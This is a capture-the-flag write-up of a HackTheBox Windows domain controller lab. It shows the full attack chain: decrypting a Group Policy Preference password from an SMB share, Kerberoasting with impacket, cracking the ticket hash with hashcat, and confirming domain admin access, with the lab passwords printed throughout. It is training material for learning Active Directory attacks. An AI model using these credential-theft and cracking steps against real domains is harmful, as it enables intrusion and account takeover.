## Introduction

This writeup documents the process of compromising the `active` machine, a Windows Server 2008 R2 domain controller in the HackTheBox environment. The goal was to gain initial access and escalate privileges to Domain Administrator. The attack path leveraged a misconfigured SMB share exposing Group Policy Preference (GPP) credentials, followed by a Kerberoasting attack to crack the Administrator’s password. This box highlights common Active Directory misconfigurations and weak password practices.

## Reconnaissance

### Network Mapping

I started with an `nmap` scan to identify open ports, services, and system details on the target (10.129.239.161). The command used was:

```shell
nmap -sC -sV -T4 -oA reports/nmap_report 10.129.239.161
```

Parameters:
 - -sC: Default scripts for additional enumeration.
 - -sV: Service version detection.
 - -T4: Aggressive timing for faster scanning.
 - -oA reports/nmap_report: Save output in all formats.

## Foothold

The `Groups.xml` file in the `Replication` share contained a Group Policy Preference (GPP) configuration with an encrypted password for the `active.htb\SVC_TGS` account:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

I decrypted the cpassword using `gpp-decrypt`:

```shell
┌──(elodvk㉿kali)-[~/hack-the-box/active/active.htb]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```


## Privilege Escalation

└─$ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile GetUserSPNs.out

### Password Cracking

I used `hashcat` to crack the TGS ticket hash with the `rockyou.txt` wordlist, targeting the Kerberos TGS-REP hash format (`-m 13100`):

```shell
┌──(elodvk㉿kali)-[~/hack-the-box/active]
└─$ hashcat -a 0 -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --quiet
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*[...]:Ticketmaster1968
```

The Administrator’s password was revealed as `Ticketmaster1968`, cracked almost instantly due to its presence in the `rockyou.txt` wordlist—a clear sign of weak password choice.

### Gaining Domain Admin Access

With the `Administrator` credentials, I verified access using `netexec`:

```shell
┌──(elodvk㉿kali)-[~/hack-the-box/active]
└─$ netexec smb 10.129.239.161 -u administrator -p Ticketmaster1968       
SMB         10.129.239.161  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.239.161  445    DC               [+] active.htb\administrator:Ticketmaster1968 (Pwn3d!)

```

This confirmed Domain Administrator privileges, granting full control over the `active.htb` domain.
